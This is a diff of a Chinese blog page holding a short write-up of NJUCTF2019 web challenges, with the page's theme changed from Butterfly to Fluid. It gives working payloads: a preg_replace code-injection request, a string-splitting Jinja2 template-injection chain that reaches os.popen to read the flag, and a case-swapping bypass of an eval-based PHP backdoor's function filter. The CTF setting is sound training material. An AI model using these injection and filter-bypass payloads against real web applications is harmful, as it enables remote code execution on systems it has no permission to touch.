@@ -1,169 +1,270 @@
-<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NJUCTF2019-部分wp | Jesen's Blog</title><meta name="keywords" content="CTF,web,南京邮电CTF"><meta name="author" content="Jesen"><meta name="copyright" content="Jesen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言虽然拿了一血但是是靠手速哈哈。 web-replace既然这么出了一定是考replace.  提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。 首页三个框框: 目测是对应preg_replace 三个参数。  preg_replace ( mixed $pattern , mixed $replacement , mixed $subj">
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jesen">
+  <meta name="keywords" content="Jesen,Jesen&#39;s Blog,ctf,writeups,web,渗透,渗透测试">
+  
+    <meta name="description" content="前言虽然拿了一血但是是靠手速哈哈。 web-replace既然这么出了一定是考replace.  提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。 首页三个框框: 目测是对应preg_replace 三个参数。  preg_replace ( mixed $pattern , mixed $replacement , mixed $subj">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NJUCTF2019-部分wp">
 <meta property="og:url" content="https://jesen.ddwhm.com/2019/11/24/NJUCTF2019.html">
 <meta property="og:site_name" content="Jesen&#39;s Blog">
 <meta property="og:description" content="前言虽然拿了一血但是是靠手速哈哈。 web-replace既然这么出了一定是考replace.  提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。 首页三个框框: 目测是对应preg_replace 三个参数。  preg_replace ( mixed $pattern , mixed $replacement , mixed $subj">
 <meta property="og:locale">
-<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="og:image" content="https://jesen.ddwhm.com/images/image-20191124193302903.png">
+<meta property="og:image" content="https://jesen.ddwhm.com/images/image-20191124193404646.png">
+<meta property="og:image" content="https://jesen.ddwhm.com/images/image-20191124193919224.png">
+<meta property="og:image" content="https://jesen.ddwhm.com/images/image-20191124193932138.png">
+<meta property="og:image" content="https://jesen.ddwhm.com/images/image-20191124193949934.png">
 <meta property="article:published_time" content="2019-11-24T11:28:28.000Z">
 <meta property="article:modified_time" content="2019-11-24T12:04:27.937Z">
 <meta property="article:author" content="Jesen">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="南京邮电CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg"><link rel="canonical" href="https://jesen.ddwhm.com/2019/11/24/NJUCTF2019"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
-  google_ad_client: 'ca-pub-6452254005307046',
-  enable_page_level_ads: 'true'
-});</script><script>const GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  date_suffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
-    },
-    fancybox: {
-      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: true,
-  isanchor: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'NJUCTF2019-部分wp',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2019-11-24 20:04:27'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
-
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
-
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
-
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
-
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jesen.ddwhm.com/images/image-20191124193302903.png">
   
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
   
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
+  <title>NJUCTF2019-部分wp - Jesen&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
     
-          if (t === 'dark') activateDarkMode()
-          else if (t === 'light') activateLightMode()
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"jesen.ddwhm.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-music"></i><span> 测试1</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-video"></i><span> 测试2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jesen's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-music"></i><span> 测试1</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-video"></i><span> 测试2</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">NJUCTF2019-部分wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-24T11:28:28.000Z" title="发表于 2019-11-24 19:28:28">2019-11-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2019-11-24T12:04:27.937Z" title="更新于 2019-11-24 20:04:27">2019-11-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">914</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NJUCTF2019-部分wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虽然拿了一血但是是靠手速哈哈。</p>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="NJUCTF2019-部分wp">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-11-24 19:28" pubdate>
+        November 24, 2019 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">NJUCTF2019-部分wp</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虽然拿了一血但是是靠手速哈哈。</p>
 <h1 id="web-replace"><a href="#web-replace" class="headerlink" title="web-replace"></a>web-replace</h1><p>既然这么出了一定是考replace.</p>
-<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191124193302903.png" alt="image-20191124193302903"></p>
+<p><img src="/images/image-20191124193302903.png" srcset="/img/loading.gif" lazyload alt="image-20191124193302903"></p>
 <p>提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。</p>
-<p>首页三个框框:<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191124193404646.png" alt="image-20191124193404646"></p>
+<p>首页三个框框:<img src="/images/image-20191124193404646.png" srcset="/img/loading.gif" lazyload alt="image-20191124193404646"></p>
 <p>目测是对应preg_replace 三个参数。</p>
 <p> <code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code> </p>
 <p>总的来说就是: <code>preg_replace(‘原来的文本’,‘替换的单词’,‘新单词’)</code></p>
 <p>那么构造payload: <code>sub=jesen666&amp;pat=.*&amp;rep=eval($_POST[a])&amp;a=system(&#39;cat /flag&#39;);</code></p>
 <p>post过去即可。。</p>
-<h1 id="web-flask"><a href="#web-flask" class="headerlink" title="web-flask"></a>web-flask</h1><p>这题过于简单。。<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191124193919224.png" alt="image-20191124193919224"></p>
-<p>进门这个点击以后看看，<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191124193932138.png" alt="image-20191124193932138"></p>
-<p>修改以下url:<img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/image-20191124193949934.png" alt="image-20191124193949934"></p>
+<h1 id="web-flask"><a href="#web-flask" class="headerlink" title="web-flask"></a>web-flask</h1><p>这题过于简单。。<img src="/images/image-20191124193919224.png" srcset="/img/loading.gif" lazyload alt="image-20191124193919224"></p>
+<p>进门这个点击以后看看，<img src="/images/image-20191124193932138.png" srcset="/img/loading.gif" lazyload alt="image-20191124193932138"></p>
+<p>修改以下url:<img src="/images/image-20191124193949934.png" srcset="/img/loading.gif" lazyload alt="image-20191124193949934"></p>
 <p>漏洞已经出现，这里直接放出payload。毕竟原理在网上已经有。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/base1&#123;&#123;request[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>].__base__.__base__.__base__[<span class="string">&#x27;__subcla&#x27;</span>+<span class="string">&#x27;sses__&#x27;</span>]()[<span class="number">60</span>][<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__&#x27;</span>+<span class="string">&#x27;glo&#x27;</span>+<span class="string">&#x27;bal&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>][<span class="string">&#x27;__bu&#x27;</span>+<span class="string">&#x27;iltins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__im&#x27;</span>+<span class="string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;cat /f&quot;+&quot;lag&quot;).re&#x27;</span>+<span class="string">&#x27;ad()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs python">http://nctf2019.x1ct34m.com:<span class="hljs-number">40007</span>/base1&#123;&#123;request[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>].__base__.__base__.__base__[<span class="hljs-string">&#x27;__subcla&#x27;</span>+<span class="hljs-string">&#x27;sses__&#x27;</span>]()[<span class="hljs-number">60</span>][<span class="hljs-string">&#x27;__in&#x27;</span>+<span class="hljs-string">&#x27;it__&#x27;</span>][<span class="hljs-string">&#x27;__&#x27;</span>+<span class="hljs-string">&#x27;glo&#x27;</span>+<span class="hljs-string">&#x27;bal&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>][<span class="hljs-string">&#x27;__bu&#x27;</span>+<span class="hljs-string">&#x27;iltins__&#x27;</span>][<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>](<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="hljs-string">&#x27;pen(&quot;cat /f&quot;+&quot;lag&quot;).re&#x27;</span>+<span class="hljs-string">&#x27;ad()&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这里注意它过滤了flag字符，所以需要拆开flag后用+链接。。。</p>
 <h1 id="web-hacker-backdoor"><a href="#web-hacker-backdoor" class="headerlink" title="web-hacker_backdoor"></a>web-hacker_backdoor</h1><p>给出代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;useful&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$usrful</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;useful&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dangerous</span> = get_defined_functions();</span><br><span class="line">    array_push(<span class="variable">$dangerous</span>[<span class="string">&quot;internal&quot;</span>], <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dangerous</span>[<span class="string">&quot;internal&quot;</span>] <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$a</span>,<span class="variable">$bad</span>) !== <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$usrful</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(waf(<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;oh,不能输入这些函数哦 :) &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;useful&#x27;</span>]))&#123;<br>    highlight_file(<span class="hljs-keyword">__file__</span>);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-variable">$usrful</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;useful&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$dangerous</span> = get_defined_functions();<br>    array_push(<span class="hljs-variable">$dangerous</span>[<span class="hljs-string">&quot;internal&quot;</span>], <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous</span>[<span class="hljs-string">&quot;internal&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$bad</span>) &#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$bad</span>) !== <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br>        <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$usrful</span>))&#123;<br>    <span class="hljs-keyword">if</span>(waf(<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh,不能输入这些函数哦 :) &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>分析以下：需要get传入code和useful参数，useful参数需要是系统已经存在的文件。这里使用file:///etc/passwd</p>
 <p>$dangerous数组，把内置函数全部取出，并加入eval和assert来阻止执行。</p>
@@ -171,51 +272,228 @@
 <p>那么就简单了。构造  <code>/?code=PhPinfO();&amp;useful=file:///etc/passwd</code>成功绕过。</p>
